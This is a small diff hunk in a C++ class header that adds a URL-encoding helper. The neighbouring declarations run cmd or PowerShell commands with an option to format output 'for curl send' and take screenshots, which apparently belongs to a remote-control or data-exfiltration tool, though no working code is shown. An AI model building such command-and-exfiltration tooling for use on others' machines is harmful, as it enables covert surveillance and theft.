@@ -42,7 +42,7 @@ protected:
 	std::string ReadFromFile(const std::string& path); // Read from file
 	std::string CMD(std::string command, BOOL modify_for_curl_send = FALSE, BOOL powershell = FALSE,  BOOL changeDirectory = FALSE, BOOL fileExplorer = FALSE); // Execute command on the cmd (or powershell) and get the result
 	BOOL TakeScreenshot(const std::string& save_path); // Take a screenshot and save to file at specific path
-	
+	std::string URLEncode(const std::string& str); // URL Encode a string
 
 public:
 
